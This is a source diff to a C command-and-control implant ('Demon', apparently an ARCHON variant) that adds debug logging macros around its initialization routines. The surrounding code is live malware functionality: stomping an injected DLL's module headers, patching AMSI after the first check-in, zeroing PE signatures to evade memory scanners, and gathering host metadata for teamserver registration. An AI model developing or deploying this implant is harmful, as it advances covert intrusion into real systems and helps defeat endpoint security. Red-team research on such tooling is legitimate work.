@@ -24,6 +24,15 @@
 /* ARC-05: module stomping for injected DLL payload */
 #include <inject/ModuleStomp.h>
 
+/* Init-phase logging via the same HttpWriteDebugLog mechanism used in TransportHttp.c.
+ * Active only when ARCHON_HTTP_LOG is compiled in (set ARCHON_HTTP_LOG=1 in teamserver env). */
+#include <core/TransportHttp.h>
+#ifdef ARCHON_HTTP_LOG
+#define INIT_LOG( msg ) HttpWriteDebugLog( (msg), NtGetLastError() )
+#else
+#define INIT_LOG( msg ) do { } while (0)
+#endif
+
 #ifdef ARCHON_ECDH_MODE
 #include <bcrypt.h>
 
@@ -61,9 +70,11 @@ VOID DemonMain( PVOID ModuleInst, PKAYN_ARGS KArgs )
 
     /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
     DemonInit( ModuleInst, KArgs );
+    INIT_LOG( "DemonMain: DemonInit returned" );
 
     /* Initialize MetaData */
     DemonMetaData( &Instance->MetaData, TRUE );
+    INIT_LOG( "DemonMain: DemonMetaData returned" );
 
     /* Main demon routine */
     DemonRoutine();
@@ -88,6 +99,8 @@ VOID DemonRoutine()
      * not intercept amsi.dll load from a process with zero network connections.
      * Applied once after the first successful checkin. */
     BOOL AmsiPatched = FALSE;
+
+    INIT_LOG( "DemonRoutine: entering main loop" );
 
     /* the main loop */
     for ( ;; )
@@ -258,6 +271,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         PackageAddInt32( *MetaData, 0 );
 
     // Get internal IP
+    INIT_LOG( "DemonMetaData: GetAdaptersInfo enter" );
     dwLength = 0;
     if ( Instance->Win32.GetAdaptersInfo( NULL, &dwLength ) )
     {
@@ -274,6 +288,8 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     }
     else
         PackageAddInt32( *MetaData, 0 );
+
+    INIT_LOG( "DemonMetaData: GetAdaptersInfo done" );
 
     // Get Process Path
     PackageAddWString( *MetaData, ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance->Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Buffer );
@@ -306,7 +322,10 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
      * The teamserver will register this agent with legacy_ctr = false. */
     PackageAddInt32( *MetaData, DEMON_INITIALIZE_EXT_MONOTONIC_CTR );
 
+    INIT_LOG( "DemonMetaData: metadata collected" );
+
 #ifdef ARCHON_ECDH_MODE
+    INIT_LOG( "DemonMetaData: ECDH build enter" );
     {
         /* Build the ECDH registration packet from the metadata that follows the
          * AES key/IV prefix.  Package layout at this point:
@@ -347,6 +366,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
             }
         }
     }
+    INIT_LOG( "DemonMetaData: ECDH build done" );
 #endif
 }
 
@@ -578,9 +598,11 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         /* load module */
         if ( ! ( ( BOOL (*)() ) RtModules[ i ] ) () ) {
             PUTS( "Failed to load a module" )
+            INIT_LOG( "DemonInit: RtModule load FAILED" );
             return;
         }
     }
+    INIT_LOG( "DemonInit: modules loaded" );
 
     if ( KArgs )
     {
@@ -610,11 +632,13 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     /* ARC-05: stomp our own DLL's PE headers with a decoy to defeat memory
      * scanners.  Must run after ModuleBase is known and before the agent
      * enters the main routine (headers are only needed during init). */
+    INIT_LOG( "DemonInit: ARC-05 enter" );
     if ( Instance->Config.Implant.ModuleStomp && Instance->Session.ModuleBase ) {
         if ( ! NT_SUCCESS( ModuleStompHeaders() ) ) {
             PUTS( "[INIT] Warning: module header stomp failed" )
         }
     }
+    INIT_LOG( "DemonInit: ARC-05 done" );
 
     /* ARC-07: unconditionally zero the MZ/DOS/PE signatures at our base
      * address.  Runs after ARC-05 (if enabled) so that even the decoy
@@ -625,6 +649,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
             PUTS( "[INIT] Warning: PE header signature erasure failed" )
         }
     }
+    INIT_LOG( "DemonInit: complete" );
 
 #if _WIN64
     Instance->Session.OS_Arch      = PROCESSOR_ARCHITECTURE_AMD64;
